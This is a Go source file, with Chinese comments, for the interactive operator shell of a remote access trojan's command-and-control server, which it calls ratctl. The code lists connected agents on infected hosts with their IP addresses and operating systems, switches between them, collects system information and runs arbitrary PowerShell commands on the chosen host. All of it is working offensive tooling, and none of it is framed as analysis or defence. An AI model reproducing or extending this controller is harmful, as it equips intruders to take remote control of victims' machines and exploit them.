// repl.go — ratctl 交互式 shell：REPL 循环与命令实现
package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"ratc2/internal/protocol"
)

// repl 主循环：读一行 → 解析 → 分发。
func (st *shellState) repl() {
	r := bufio.NewReader(os.Stdin)
	for {
		st.printPrompt()
		line, err := r.ReadString('\n')
		if err != nil {
			break // EOF（exit / Ctrl+D）
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !st.dispatch(line) {
			break
		}
	}
	fmt.Println()
}

func (st *shellState) printPrompt() {
	st.curMu.Lock()
	cur := st.cur
	st.curMu.Unlock()
	if cur == "" {
		fmt.Print("ratctl> ")
	} else {
		fmt.Printf("ratctl[%s]> ", shortID(cur))
	}
}

// dispatch 执行一条命令；返回 false 表示退出 REPL。
func (st *shellState) dispatch(line string) bool {
	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	args := fields[1:]
	rest := ""
	if i := strings.Index(line, " "); i >= 0 {
		rest = strings.TrimSpace(line[i+1:])
	}

	switch cmd {
	case "sessions", "list":
		st.cmdSessions()
	case "use":
		if len(args) < 1 {
			fmt.Println("usage: use <agent_id>")
		} else {
			st.cmdUse(args[0])
		}
	case "back":
		st.curMu.Lock()
		st.cur = ""
		st.curMu.Unlock()
	case "sysinfo":
		st.cmdSysinfo()
	case "exec":
		if rest == "" {
			fmt.Println("usage: exec <powershell command>")
		} else {
			st.cmdExec(rest)
		}
	case "help", "?":
		printHelp()
	case "exit", "quit":
		return false
	default:
		fmt.Printf("unknown command: %s (type 'help')\n", cmd)
	}
	return true
}

// cmdSessions 列出在线 Agent（并缓存列表供 use 校验）。
func (st *shellState) cmdSessions() {
	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
		protocol.CtlList, waitTimeout)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	sessions, err := decodeSessions(body)
	if err != nil {
		fmt.Printf("[!] decode sessions: %v\n", err)
		return
	}
	st.sessions = sessions

	if len(sessions) == 0 {
		fmt.Println("(no agents online)")
		return
	}
	fmt.Printf("%-34s %-15s %-6s %-24s %-10s %s\n",
		"AGENT ID", "IP", "PORT", "OS", "LAST SEEN", "ONLINE")
	for _, s := range sessions {
		online := "yes"
		if !s.Online {
			online = "no"
		}
		fmt.Printf("%-34s %-15s %-6d %-24s %-10s %s\n",
			s.ID, s.IP, s.Port, trunc(s.OS, 23),
			s.LastSeen.Format("15:04:05"), online)
	}
}

// cmdUse 切换当前 Agent（id 需在最近 sessions 列表中存在）。
func (st *shellState) cmdUse(id string) {
	for _, s := range st.sessions {
		if strings.HasPrefix(s.ID, id) {
			st.curMu.Lock()
			st.cur = s.ID
			st.curMu.Unlock()
			fmt.Printf("[*] switched to agent %s (os=%s)\n", s.ID, trunc(s.OS, 40))
			return
		}
	}
	// 前缀匹配失败则尝试刷新一次列表再查
	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
		protocol.CtlList, waitTimeout)
	if err == nil {
		if sessions, derr := decodeSessions(body); derr == nil {
			st.sessions = sessions
			for _, s := range sessions {
				if strings.HasPrefix(s.ID, id) {
					st.curMu.Lock()
					st.cur = s.ID
					st.curMu.Unlock()
					fmt.Printf("[*] switched to agent %s\n", s.ID)
					return
				}
			}
		}
	}
	fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", id)
}

// cmdSysinfo 收集当前 Agent 系统信息。
func (st *shellState) cmdSysinfo() {
	status, text, err := st.execBusiness(protocol.CmdSysInfo, nil)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, text)
		return
	}
	fmt.Print(text)
	if len(text) > 0 && text[len(text)-1] != '\n' {
		fmt.Println()
	}
}

// cmdExec 在当前 Agent 执行 PowerShell 命令。
func (st *shellState) cmdExec(command string) {
	status, text, err := st.execBusiness(protocol.CmdExecPs, []byte(command))
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, text)
		return
	}
	fmt.Print(text)
	if len(text) > 0 && text[len(text)-1] != '\n' {
		fmt.Println()
	}
}

func printHelp() {
	fmt.Println(`ratctl - C2 交互式控制端（beacon 信道）

会话管理:
  sessions                  列出在线 Agent
  use <agent_id>            切换到目标 Agent（支持前缀匹配）
  back                      退出当前 Agent

当前 Agent 操作（需先 use）:
  sysinfo                   收集系统信息
  exec <command>            执行 PowerShell 命令

通用:
  help / ?                  显示本帮助
  exit / quit               退出`)
}
